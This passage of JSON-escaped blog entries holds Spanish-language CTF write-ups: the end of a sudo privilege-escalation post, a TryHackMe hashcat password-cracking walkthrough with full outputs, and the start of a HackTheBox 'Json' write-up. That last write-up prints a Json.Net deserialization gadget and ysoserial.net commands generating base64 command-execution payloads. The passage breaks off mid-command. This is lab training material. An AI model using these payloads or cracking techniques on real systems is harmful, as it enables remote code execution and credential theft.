SUDO):\nUtilizamos el exploit de CVE-2019-18364 para explotar la vulnerabilidad de buffer overflow que tiene sudo:\nObtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"CherryBlossom es una maquina de TryHackMe, expone SMB donde encontramos una imagen codificada, por medio de esteganografia obtuvimos un wordlist y usuario, tras ejecutar Hydra a SSH obtuvimos acceso. Realizamos movimiento lateral crackeando la contraseña de un backup de shadow. Para escalar privilegios explotamos una vulnerabilidad en sudo.","id":104,"section":"posts","tags":["enum4linux","smbclient","xxd","steganography","stegpy","fcrackzip","sudo privesc","ctf like"],"title":"TryHackMe - CherryBlossom","uri":"https://sckull.github.io/posts/cherryblossom/"},{"content":"  Password Cracking de TryHackMe, presenta una serie de hashes las cuales crackeamos utilizando Hashcat y combinaciones de wordlist para obtener las credenciales.\nRoom    Titulo Password Cracking      Descripción Crack the password by using different techniques   Puntos *   Dificultad Media   Maker F4_U57     Hashcat - Tutorial the basics of cracking password\nBruteforce MD5 En esta serie de retos se utilizará hashcat para poder obtener la flag de cada uno de los retos. La lista de caracteres que se utilizarán para obtener las flags:\n1 2 3 4 5 6 7 8  ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?h = 0123456789abcdef ?H = 0123456789ABCDEF ?s = «space»!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`{|}~ ?a = ?l?u?d?s ?b = 0x00 – 0xff   MD5 #1 Reto:\needb694a362f8ab2effbad5e4c8fa095 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. eedb694a362f8ab2effbad5e4c8fa095:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: eedb694a362f8ab2effbad5e4c8fa095 Time.Started.....: Tue Feb 18 20:32:56 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:32:56 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d [15] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 4765.5 kH/s (0.01ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 1000/1000 (100.00%) Rejected.........: 0/1000 (0.00%) Restore.Point....: 0/1000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-123 -\u0026gt; TRY-HACK-ME-573 Hardware.Mon.#1..: Temp: 53c Util: 16% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:32:51 2020 Stopped: Tue Feb 18 20:32:57 2020 sckull@uplifted:~/tools/hashcat$   MD5 #2 Reto:\needb694a362f8ab2effbad5e4c8fa095 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 19b489d1c4220946b38d65a7fce24372:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 19b489d1c4220946b38d65a7fce24372 Time.Started.....: Tue Feb 18 20:35:18 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:35:18 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d?d [16] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 13550.0 kH/s (0.12ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 10000/10000 (100.00%) Rejected.........: 0/10000 (0.00%) Restore.Point....: 0/10000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-1234 -\u0026gt; TRY-HACK-ME-5739 Hardware.Mon.#1..: Temp: 55c Util: 15% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:35:15 2020 Stopped: Tue Feb 18 20:35:19 2020 sckull@uplifted:~/tools/hashcat$   MD5 #3 Reto:\n7353d3b528592ecd12139fba62c43287 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 3 -m 0 hash.txt TRY-HACK-ME-?d?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Brute-Force * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 7353d3b528592ecd12139fba62c43287:TRY-HACK-ME-[... snip ...] Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 7353d3b528592ecd12139fba62c43287 Time.Started.....: Tue Feb 18 20:37:10 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:37:10 2020 (0 secs) Guess.Mask.......: TRY-HACK-ME-?d?d?d?d?d [17] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 17768.1 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 100000/100000 (100.00%) Rejected.........: 0/100000 (0.00%) Restore.Point....: 0/100000 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: TRY-HACK-ME-12345 -\u0026gt; TRY-HACK-ME-57397 Hardware.Mon.#1..: Temp: 56c Util: 63% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:37:07 2020 Stopped: Tue Feb 18 20:37:11 2020 sckull@uplifted:~/tools/hashcat$   Combination (MD5) En esta seccion nos proporcionan tres diccionarios los cuales debemos de combinar segun el reto que se presente, utilizamos combinator de hashcat, el cual utiliza dos diccionarios y los combina (diccionario1diccionario2) para poder crackear un hash.\nMD5 #1 Reto:\na united states city followed by 2 digits (all lowercase) 0f8e6ad80411e27fc85ba1f79153dd8f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt us-city.txt ?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: us-city.txt * Passwords.: 2011 * Bytes.....: 19099 * Keyspace..: 201100 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. 0f8e6ad80411e27fc85ba1f79153dd8f:penn[... snip ...]ia46 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: 0f8e6ad80411e27fc85ba1f79153dd8f Time.Started.....: Tue Feb 18 20:46:41 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:46:41 2020 (0 secs) Guess.Base.......: File (us-city.txt), Left Side Guess.Mod........: Mask (?d?d) [2], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 70748.6 kH/s (0.28ms) @ Accel:128 Loops:50 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 201100/201100 (100.00%) Rejected.........: 0/201100 (0.00%) Restore.Point....: 0/2011 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:50-100 Iteration:0-50 Candidates.#1....: alabama13 -\u0026gt; worland68 Hardware.Mon.#1..: Temp: 53c Util: 62% Core:1176MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:46:36 2020 Stopped: Tue Feb 18 20:46:42 2020 sckull@uplifted:~/tools/hashcat$   MD5 #2 Reto:\na united states city followed by a simple color, followed by 3 digits (all lowercase). fbd527693aceda78b30a978d7d3b9abb Combinator:\n./combinator.bin ../../us-city.txt ../../color.txt \u0026gt; ../../us-city-color.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt us-city-color.txt ?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: us-city-color.txt * Passwords.: 50275 * Bytes.....: 740916 * Keyspace..: 50275000 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. fbd527693aceda78b30a978d7d3b9abb:phoe[... snip ...]rple585 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: fbd527693aceda78b30a978d7d3b9abb Time.Started.....: Tue Feb 18 20:58:05 2020 (0 secs) Time.Estimated...: Tue Feb 18 20:58:05 2020 (0 secs) Guess.Base.......: File (us-city-color.txt), Left Side Guess.Mod........: Mask (?d?d?d) [3], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 473.0 MH/s (5.50ms) @ Accel:128 Loops:62 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 24936400/50275000 (49.60%) Rejected.........: 0/24936400 (0.00%) Restore.Point....: 0/50275 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:434-496 Iteration:0-62 Candidates.#1....: alabamared925 -\u0026gt; worlandgrey405 Hardware.Mon.#1..: Temp: 49c Util: 56% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 20:58:02 2020 Stopped: Tue Feb 18 20:58:06 2020 sckull@uplifted:~/tools/hashcat$   MD5 #3 Reto:\na simple color followed by a country, followed by 4 digits (all lowercase). a4131ef4610be60c0c6a3656b00dd763 Combinator:\n./combinator.bin ../../color.txt ../../country.txt \u0026gt; ../../color-country.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -a 6 -m 0 hash.txt color-country.txt ?d?d?d?d hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache built: * Filename..: color-country.txt * Passwords.: 4775 * Bytes.....: 66846 * Keyspace..: 47750000 * Runtime...: 0 secs The wordlist or mask that you are using is too small. This means that hashcat cannot use the full parallel power of your device(s). Unless you supply more work, your cracking speed will drop. For tips on supplying more work, see: https://hashcat.net/faq/morework Approaching final keyspace - workload adjusted. a4131ef4610be60c0c6a3656b00dd763:blue[... snip ...]7926 Session..........: hashcat Status...........: Cracked Hash.Type........: MD5 Hash.Target......: a4131ef4610be60c0c6a3656b00dd763 Time.Started.....: Tue Feb 18 21:00:36 2020 (0 secs) Time.Estimated...: Tue Feb 18 21:00:36 2020 (0 secs) Guess.Base.......: File (color-country.txt), Left Side Guess.Mod........: Mask (?d?d?d?d) [4], Right Side Guess.Queue.Base.: 1/1 (100.00%) Guess.Queue.Mod..: 1/1 (100.00%) Speed.#1.........: 355.7 MH/s (0.63ms) @ Accel:128 Loops:64 Thr:256 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 35755200/47750000 (74.88%) Rejected.........: 0/35755200 (0.00%) Restore.Point....: 0/4775 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:7424-7488 Iteration:0-64 Candidates.#1....: redafghanistan9147 -\u0026gt; greyzimbabwe8479 Hardware.Mon.#1..: Temp: 55c Util: 87% Core:1189MHz Mem:2505MHz Bus:4 Started: Tue Feb 18 21:00:33 2020 Stopped: Tue Feb 18 21:00:37 2020 sckull@uplifted:~/tools/hashcat$   Rainbow Table (NTLM) En esta seccion utilizaremos ophcrack para poder cracker los hashes utilizando un rainbow table. Ophcrack viene incluido en el sistema de Kali Linux, por lo que debemos de descargar unicamente el rainbow table XP special (8GB).\nRetos:\n1 2 3  FF6EDF5C42F0FE57AAD5360A07991BD6:A2F77301E3162DB9213E3DA35D5EA931 1CDEE68485E23D0E1DD9CED345A47D0C:D4F3A9ACC8448BC9EF7C53B3BBBEC9C3 8C7972A6362411C1B0D3662B97EBED58:DAE91036E4B2E7F0B5061956BCE39A3E   Importamos los hashes a ophrack y esperamos el resultado:\n","description":"Password Cracking de TryHackMe presenta una serie de hashes las cuales crackeamos utilizando Hashcat y combinaciones de wordlist para obtener las credenciales.","id":105,"section":"posts","tags":["hashcat"],"title":"TryHackMe - Password Cracking","uri":"https://sckull.github.io/posts/password_cracking_thm/"},{"content":"  Descubrimos una vulnerabilidad de deserializacion en Json.net y usando ysoserial obtuvimos una shell inversa. Vemos que el usuario tiene permisos SeImpersonatePrivilege con ello escalamos privilegios utilizando JuicyPotato en su version para PowerShell.\nInformacion de la Maquina    Nombre Json      OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.158   Maker Cyb3rb0b    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.6, 7.9, 7.4, 2.6, 2.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  root@kali:~/htb/json# masscan -p1-65535,U:1-65535 10.10.10.158 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-30 22:56:02 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49153/tcp on 10.10.10.158 Discovered open port 445/tcp on 10.10.10.158 Discovered open port 5985/tcp on 10.10.10.158 Discovered open port 139/tcp on 10.10.10.158 Discovered open port 49155/tcp on 10.10.10.158 Discovered open port 135/tcp on 10.10.10.158 Discovered open port 47001/tcp on 10.10.10.158 Discovered open port 49157/tcp on 10.10.10.158 Discovered open port 21/tcp on 10.10.10.158 Discovered open port 49152/tcp on 10.10.10.158 # Nmap 7.80 scan initiated Mon Sep 30 19:14:28 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.158 Warning: 10.10.10.158 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.158 Host is up (0.23s latency). Not shown: 64567 closed ports, 954 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown # Nmap done at Mon Sep 30 19:19:17 2019 -- 1 IP address (1 host up) scanned in 289.09 seconds # Nmap 7.80 scan initiated Mon Sep 30 19:20:55 2019 as: nmap -p 21,80,135,139,445,5985,47001 -sV -sC -o services_script.nmap 10.10.10.158 Nmap scan report for 10.10.10.158 Host is up (0.56s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 135/tcp open msrpc? 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 4h00m42s, deviation: 0s, median: 4h00m42s |_nbstat: NetBIOS name: JSON, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:bd:94:b0 (VMware) |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-10-01T03:24:25 |_ start_date: 2019-10-01T00:14:50 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 30 19:24:33 2019 -- 1 IP address (1 host up) scanned in 217.67 seconds   FTP Intentamos logearnos al servicio ftp con el usuario y contraseña anonymous pero no esta autorizado el usuario, tambien podemos ver la version del servicio ftp.\nHTTP \u0026gt; GOBUSTER Algunos directorios y paginas encontradas con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.158 [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html [+] No status: true [+] Timeout: 10s =============================================================== 2019/09/30 20:23:11 Starting gobuster =============================================================== /css /files /img /index.html /Index.html /index.html /js /login.html /Login.html /views =============================================================== 2019/09/30 20:35:16 Finished ===============================================================   /index.html Visitamos el index de la pagina y nos muestra una plataforma.\n/login.html Vemos una pagina de inicio de sesion en esta pagina.\nVerificamos las peticiones en index.html y encontramos que en el header existe una Cookie del tipo OAuth2 y tambien.\nDecodificamos el string en base64 vemos el usuario y contraseña de admin.\n1  {\u0026#34;Id\u0026#34;:1,\u0026#34;UserName\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;Password\u0026#34;:\u0026#34;21232f297a57a5a743894a0e4a801fc3\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;User Admin HTB\u0026#34;,\u0026#34;Rol\u0026#34;:\u0026#34;Administrator\u0026#34;}   Buscamos el hash del usuario admin en crackstation, el cual no sirve de nada.\n1  21232f297a57a5a743894a0e4a801fc3:admin   Enviamos una solicitud erronea en base64, la cual contenia un mensaje: \u0026ldquo;Lorem ipsum\u0026rdquo;.\nVemos que dentro del mensaje de error nos muestra \u0026ldquo;Cannot deserialize Json.Net Object\u0026rdquo;.\nJson.net RCE - Deserialization Investigamos acerca del framework Json.net y vemos que existe una vulnerabilidad.\nJson Attacks\nUtilizamos ysoserial.net para poder generar nuestro payload codificado y enviarlo a la maquina, para esto utilizamos el PoC y lo modificamos.\nPoC:\n1 2 3 4 5 6 7 8 9  { \u0026#39;$type\u0026#39;:\u0026#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\u0026#39;, \u0026#39;MethodName\u0026#39;:\u0026#39;Start\u0026#39;, \u0026#39;MethodParameters\u0026#39;:{ \u0026#39;$type\u0026#39;:\u0026#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;, \u0026#39;$values\u0026#39;:[\u0026#39;cmd\u0026#39;,\u0026#39;/c calc\u0026#39;] }, \u0026#39;ObjectInstance\u0026#39;:{\u0026#39;$type\u0026#39;:\u0026#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\u0026#39;} }   Realizamos dos pruebas uno para hacer ping a nuestra maquina local y uno para hacer una prueba de resolucion de dominios.\n1 2 3  ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c \u0026#34;ping -n 5 10.10.14.147\u0026#34; -t \u0026gt; payload_jsonnet_ping.txt ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcGluZyAtbiA1IDEwLjEwLjE0LjE0NyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9   1 2 3  ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c \u0026#34;nslookup sckull 10.10.14.147\u0026#34; 